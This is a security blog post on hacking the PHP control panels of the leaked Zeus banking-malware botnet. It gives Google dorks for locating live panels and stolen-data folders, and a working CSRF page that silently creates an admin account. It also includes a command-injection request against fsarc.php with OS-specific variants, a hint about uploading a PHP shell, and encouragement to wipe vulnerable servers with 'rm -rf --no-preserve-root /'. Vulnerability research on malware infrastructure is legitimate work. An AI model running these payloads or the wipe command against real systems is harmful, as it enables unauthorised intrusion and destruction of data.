---           
layout: post
title: Attacking financial malware botnet panels - Zeus
date: 2019-10-08 14:00:32 UTC
updated: 2019-10-08 14:00:32 UTC
comments: false
categories: botnet remote code execution Zeus
---
<div style="">I played with leaked financial malware recently. When I saw these panels are written in PHP, my first idea was to hack them. The results are the work of one evening, please don't expect a full pentest report with all vulns found :-)</div><div style=""><br/></div><div style="">The following report is based on Zeus 2.0.8.9, which is old, but I believe a lot of Zeus clones (and C&amp;C panels) depend on this code.</div><div style=""><br/></div><div style="">First things first, here are some Google dorks to find Zeus C&amp;C server panel related stuff:</div><div style=""></div><ul><li>inurl:cp.php?m=login - this should be the login to the control panel</li><li>inurl:_reports/files  - in these folders you can find the stolen stuff, pretty funny if it gets indexed by Google</li><li>inurl:install/index.php - this should be deleted, but I think this is useless now.</li></ul><br/><div class="separator" style=""><a href="https://z6543.github.io/_img/Zeus1.png" src="https://z6543.github.io/_img/Zeus1.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="" src="https://z6543.github.io/_img/Zeus1.png" width="400"/></a></div><br/><h3>Boring vulns found</h3><ul><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_Credentials_Transported_over_an_Encrypted_Channel_(OWASP-AT-001)">Clear text HTTP login</a> - you can sniff the login password via MiTM, or steal the session cookies</li><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_Weak_password_policy_(OWASP-AT-008)">No password policy</a> - admins can set up really weak passwords</li><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OWASP-AT-004)">No anti brute-force</a> - you can try to guess the admin's password. Default username is admin</li><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OWASP-AT-006)">Password autocomplete enabled</a> - boring</li><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_cookies_attributes_(OWASP-SM-002)">Missing HttpOnly flag on session cookie</a> - it could be nice if I could find any XSS. I need more time to find one!</li><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_CSRF_(OWASP-SM-005)">No CSRF protection</a> - except on the password change, where the old password is needed :-( boring</li></ul>Update: You can use the CSRF to create a new user with admin privileges:<br/><div><div><pre class="prettyprint linenums lang-html">&lt;html&gt;<br/>&lt;head&gt;<br/>    &lt;title&gt;&lt;/title&gt;<br/>&lt;/head&gt;<br/>&lt;body&gt;<br/>    &lt;pre&gt;<br/>  This is a CSRF POC to create a new admin user in Zeus admin panels.<br/>  Username: user_1392719246 Password: admin1<br/>  You might change the URL from 127.0.0.1.<br/>  Redirecting in a hidden iframe in &lt;span id="countdown"&gt;10&lt;/span&gt; seconds.  <br/>&lt;/pre&gt;<br/>&lt;iframe id="csrf-frame" name="csrf-frame" style="display: none;"&gt;&lt;/iframe&gt;<br/>    &lt;form action="http://127.0.0.1/cp.php?m=sys_users&amp;amp;new" id="csrf-form" method="post" name="csrf-form" target="csrf-frame"&gt;<br/> &lt;input name="name" type="hidden" value="user_1392719246" /&gt; <br/> &lt;input name="password" type="hidden" value="admin1" /&gt; <br/> &lt;input name="status" type="hidden" value="1" /&gt; <br/> &lt;input name="comment" type="hidden" value="PWND!" /&gt;<br/> &lt;input name="r_botnet_bots" type="hidden" value="1" /&gt; <br/> &lt;input name="r_botnet_scripts" type="hidden" value="1" /&gt; <br/> &lt;input name="r_botnet_scripts_edit" type="hidden" value="1" /&gt; <br/> &lt;input name="r_edit_bots" type="hidden" value="1" /&gt; <br/> &lt;input name="r_reports_db" type="hidden" value="1" /&gt; <br/> &lt;input name="r_reports_db_edit" type="hidden" value="1" /&gt; <br/> &lt;input name="r_reports_files" type="hidden" value="1" /&gt;<br/> &lt;input name="r_reports_files_edit" type="hidden" value="1" /&gt;<br/> &lt;input name="r_reports_jn" type="hidden" value="1" /&gt; <br/> &lt;input name="r_stats_main" type="hidden" value="1" /&gt; <br/> &lt;input name="r_stats_main_reset" type="hidden" value="1" /&gt; <br/> &lt;input name="r_stats_os" type="hidden" value="1" /&gt; <br/> &lt;input name="r_system_info" type="hidden" value="1" /&gt; <br/> &lt;input name="r_system_options" type="hidden" value="1" /&gt;<br/> &lt;input name="r_system_user" type="hidden" value="1" /&gt; <br/> &lt;input name="r_system_users" type="hidden" value="1" /&gt;<br/>    &lt;/form&gt;<br/>&lt;script type="text/javascript"&gt;<br/> window.onload=function(){ <br/>  var counter = 10;<br/>  var interval = setInterval(function() {<br/>   counter--;<br/>   document.getElementById('countdown').innerHTML = counter;<br/>   if (counter == 0) {<br/>    redirect();<br/>    clearInterval(interval);<br/>   }<br/>  }, 1000);<br/> };<br/>    function redirect() {<br/>  document.getElementById("csrf-form").submit();<br/>    }<br/>    &lt;/script&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;<br/></pre><ul><li style="text-align: justify;">MD5 password - the passwords stored in MySQL are MD5 passwords. No <a href="http://www.unlimitednovelty.com/2012/03/dont-use-bcrypt.html">PBKDF2, bcrypt, scrypt, salt</a>, whatever. MD5.</li><li style="text-align: justify;"><a href="http://www.contextis.com/research/tools/clickjacking-tool/">ClickJacking</a> - really boring stuff</li><li style="text-align: justify;">Remember me (MD5 cookies) - a very bad idea. In this case, the remember me function is implemented in a way where the MD5 of the password and MD5 of the username is stored in a cookie. If I have XSS, I could get the MD5(password) as well.</li><li style="text-align: justify;"><a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005)">SQLi</a> - although concatenation is used instead of parameterized queries, and addslashes are used, the integers are always quoted. This means it can be hacked only in case of special encoding like GB/Big5, pretty unlikely.</li></ul><br/><h3>Whats good news (for the C&amp;C panel owners)</h3><br/>The following stuff looks good, at least some vulns were taken seriously:<br/><ul><li>The system directory is protected with .htaccess deny from all.</li><li>gate.php - this is the "gate" between the bots and the server, this PHP is always exposed to the Internet. The execution of this PHP dies early if you don't know the key. But you can <a href="http://blog.threatexpert.com/2009/09/time-to-revisit-zeus-almighty.html">get the key</a> from the binary of this specific botnet (<a href="http://mnin.blogspot.be/2011/09/abstract-memory-analysis-zeus.html">another URL how to do this</a>). If you have the key, then you can fill the database with garbage, but that's all I can think of now.</li><li>Anti <a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OWASP-DV-001)">XSS</a>: the following code is used almost everywhere</li><pre class="prettyprint lang-js">return htmlspecialchars(preg_replace('|[\x00-\x09\x0B\x0C\x0E-\x1F\x7F-\x9F]|u', ' ', $string), ENT_QUOTES, 'UTF-8');</pre>My evil thought was to inject malicious bot_id, but it looks like it has been filtered everywhere. Sad panda.</ul><br/><h3>What's really bad news (for the C&amp;C panel owners)</h3><br/>And the best vuln I was able to find, <a href="https://www.owasp.org/index.php/Testing_for_Command_Injection_(OWASP-DV-013)">remote code execution</a> through command injection (happy panda), but only for authenticated users (sad panda).<br/><br/>The vulnerable code is in system/fsarc.php:<br/><br/><div class="separator" style=""><a href="https://z6543.github.io/_img/Zeus2.png" src="https://z6543.github.io/_img/Zeus2.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="" src="https://z6543.github.io/_img/Zeus2.png" width="400"/></a></div><pre class="prettyprint lang-php">function fsarcCreate($archive, $files){<br/>   ...<br/>   $archive .= '.zip';<br/>   $cli = 'zip -r -9 -q -S "'.$archive.'" "'.implode('" "', $files).'"';<br/>   exec($cli, $e, $r);<br/>}</pre><br/>The exploit could not be simpler: <br/><pre class="prettyprint lang-html">POST /cp.php?m=reports_files&amp;path= HTTP/1.1<br/>...<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 60<br/><br/>filesaction=1&amp;files%5B%5D=files"||ping%20-n%2010%20127.0.0.1<br/></pre>because the zip utility was not found on my Windows box. You can try to replace || with &amp;&amp; when attacking Windows (don't forget to URL encode it!), or replace || with ; when attacking Linux. You can also link this vulnerability with the CSRF one, but it is unlikely you know both the control panel admin, and the control panel URLs. Or if this is the case, the admin should practice better OPSEC :)<br/>Recommendation: use <a href="http://www.php.net/manual/en/function.escapeshellcmd.php">escapeshellcmd</a> next time.<br/><br/>Next time you find a vulnerable control panel with a weak password, just rm -rf --no-preserve-root / it ;-)<br/><br/>That's all folks!<br/>Special greetz to Richard (XAMPP Apache service is running as SYSTEM ;-) )<br/><br/><b>Update:</b> Looks like the gate.php is worth to investigate if you know the RC4 key. <a href="http://cybercrime-tracker.net/zeus.php">You can upload a PHP shell :)</a></div></div>